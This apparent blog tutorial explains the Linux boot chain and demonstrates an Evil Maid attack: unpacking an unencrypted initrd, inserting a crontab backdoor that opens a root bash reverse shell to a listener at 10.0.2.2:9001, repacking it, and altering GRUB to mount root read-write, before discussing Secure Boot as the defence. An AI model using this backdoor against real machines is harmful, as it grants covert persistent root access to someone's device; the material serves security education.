---
    title: This is how they attack disk encryption on Linux 
    date(YYYY-MM-DD): 2026-03-27
---

Nowadays we carry practically our entire lives with us: phones, laptops, accounts, and communications. A large part of our information is stored on these devices and, although most include full disk encryption, the police can unlock many of them.

In this article we're going to look at an Evil Maid Attack against disk encryption on Linux. Basically, it's an attack in which an attacker needs physical access to your device in order to modify it without you noticing, altering the boot process to execute malicious code. It's the typical scenario where you leave your laptop in a hotel and, while you're away, someone tampers with it without you realizing.

It's important to keep in mind that the problem is not Linux encryption, but the incorrect implementation of the boot process.

## How does the boot process work in Linux?

Before getting into how this attack is carried out, let's take a look at how the boot process works in Linux. In general terms, it can be summarized as follows:

**[Power on] → [UEFI] → [Bootloader] → [Kernel+Initrd] → [Init system] → [Login]**

When the machine is powered on, the UEFI firmware runs and takes control, performing a series of checks to ensure the hardware is functioning correctly. Once these are completed, it consults the boot entries stored in NVRAM. Each of these entries contains the full path to an EFI binary (usually a bootloader) located in the EFI partition. Since UEFI is capable of reading FAT file systems, it can locate these binaries, load them into memory, and transfer execution to them.

By running the following command, we can see which EFI application will be executed when the system starts:

```
BootCurrent: 0008
Boot0008* debian HD(1,GPT,75a8d3c7-0bb8-47ff-8f65-68a0d25b71ab,0x800,0x3c800)/File(\EFI\debian\shimx64.efi)
```

In this case, UEFI will boot the Debian `shimx64.efi` file, an intermediate bootloader signed by Microsoft that allows Linux to start with Secure Boot enabled. This bootloader transfers execution to the real bootloader, which is usually GRUB (`grubx64.efi`).

Once GRUB runs, it accesses the boot partition and reads its configuration file `grub.cfg`. If there are multiple kernel options or operating systems, it displays a boot menu and applies the kernel parameters defined in the configuration. Finally, GRUB loads both the Linux kernel and the initrd into memory and hands off execution of the boot process to the kernel.

```
/boot/initrd.img-6.12.74+deb13+1-amd64
/boot/vmlinuz-6.12.74+deb13+1-amd64
```

At this point, the kernel is still compressed, so the first thing it does when executed is decompress and initialize itself, setting up the basic hardware environment: CPU, RAM, buses, and essential devices. To continue, the kernel needs to mount the root partition, but it does not have built-in support for all possible storage configurations such as RAID, LVM, encrypted disks, different file systems, etc.

For this reason, the kernel mounts the initrd, a compressed filesystem loaded into RAM that contains all the modules and utilities needed for the system's specific hardware. In this phase, scripts are executed that allow, for example, decrypting disks, mounting RAID or LVM volumes, and preparing everything necessary to finally mount the root filesystem (`/`) and continue booting the operating system.

Once the root partition is mounted, the init or systemd process is executed. This process initializes all system services, such as mounting other partitions, network configuration, starting daemons and essential services, and launching the graphical interface, if applicable.

## Backdooring an unencrypted boot partition

When enabling the disk encryption option in most Linux installers, they usually create the same partition scheme: an EFI partition for the bootloaders, a boot partition containing the kernel, the initrd, and the GRUB configuration, and the encrypted root partition.

```
vda            254:0    0    5G  0 disk
├─vda1         254:1    0  121M  0 part  /boot/efi
├─vda2         254:2    0  488M  0 part  /boot
└─vda3         254:3    0  4,4G  0 part
  └─vda3_crypt 253:0    0  4,4G  0 crypt /
```

As we've seen, the kernel needs certain scripts and modules found in the initrd in order to decrypt the partitions. The idea is to modify these scripts to add code that allows us to create a backdoor in the system once it has been decrypted.

Since we don't have access to the system, we boot using a live CD and mount the boot partition in the live environment. To carry out the attack, we obtain the initrd file and decompress it using the `unmkinitramfs` utility.

```
alzze@ubuntu:$ ./unmkinitramfs -v initrd.img-6.12.74+deb13+1-amd64 extracted-initrd
.
kernel
kernel/x86
kernel/x86/microcode
kernel/x86/microcode/AuthenticAMD.bin
```

Once decompressed, we see that it contains a `main/init` script. This script is the first process executed in user space within the initramfs and is responsible for loading modules, detecting devices, and setting up the basic environment, leaving the system ready to finally mount the root partition.

At this point, you already have access to one of the most critical phases of the Linux boot process, where disk decryption takes place and the root partition is prepared. Any modification in this environment can directly affect the system's security. For example, the `/sbin/cryptroot` binary or the various scripts that execute it could be altered to add a backdoor to the utility responsible for decrypting the partitions.

```
alzze@ubuntu:main $ grep -RnI "/sbin/cryptsetup" . | wc -l
11
```

In this case, we modify the init script, adding a simple backdoor that allows establishing a reverse shell once the system has fully booted. This would open the door to executing all kinds of malware on the system, such as cryptominers, keyloggers, ransomware, etc.

```
#Backdoor
CRON="${rootmnt}/etc/crontab"
LINE='* * * * *  root /bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.2/9001 0>&1"'
grep -Fq "$LINE" "$CRON" || echo "$LINE" >> "$CRON"

# Chain to real filesystem
exec run-init ${drop_caps} "${rootmnt}" "${init}" "$@" <"${rootmnt}/dev/console" >"${rootmnt}/dev/console" 2>&1
echo "Something went badly wrong in the initramfs."
panic "Please file a bug on initramfs-tools."
```

We recompress the file and replace it with the original initrd.

```
#!/bin/bash
cd extracted/early
find . -print0 | cpio --null -o -H newc > ../../early.cpio
cd ../early2
find . -print0 | cpio --null -o -H newc > ../../early2.cpio
cd ../main
find . -print0 | cpio --null -o -H newc > ../../main.cpio
cd ../..
zstd -T0 -19 main.cpio -o compressed-main.cpio

cat early.cpio early2.cpio compressed-main.cpio > initrd.img-6.12.74+deb13+1-amd64-modified
```

By default, Debian passes the `ro` parameter to the kernel, which causes the root filesystem to be mounted in read-only mode during boot. Since we need to modify system files to introduce the backdoor, it is necessary to adjust the GRUB configuration and change this parameter to `rw`, thus allowing it to be mounted with write permissions from the early stages of the boot process.

```
linux   /vmlinuz-6.12.74+deb13+1-amd64 root=UUID=c52d35dc-fe65-4d68-ae0c-812f866b19d3 rw  quiet
```

From that point on, when the system boots, permanent access to the system as the root user is established.

```
alzze@ubuntu:~ $ nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 127.0.0.1 53662
root@deb:~#
```

## Evil Maid Attack against FDE

Most Linux installers do not implement Full Disk Encryption (FDE). Although GRUB does support it, in these cases the boot partition is encrypted, but the attack does not disappear — it simply shifts location.

It is no longer possible to modify the initrd or the boot scripts as before, because all that content is encrypted. In this scenario, the target becomes the bootloader.

In FDE configurations, GRUB is responsible for prompting for the passphrase, decrypting the volume, and loading the kernel. If an attacker modifies its EFI binary in the EFI partition, they can introduce code that executes before decryption. It is still an Evil Maid Attack, but now targeting the bootloader.

The problem remains the same: the integrity of what is executed during boot is not verified.

This is where Secure Boot comes in. UEFI only executes signed and trusted binaries. If GRUB has been modified, the signature is no longer valid and the system blocks the boot process. This introduces a chain of trust that prevents this type of attack. Still, it depends on the configuration. If Secure Boot can be disabled or malicious keys are added, the protection is no longer effective.

To keep this post from getting too long, we won't go into the implementation of Secure Boot. Maybe in the future we'll dive down the TPM rabbit hole and everything behind it.
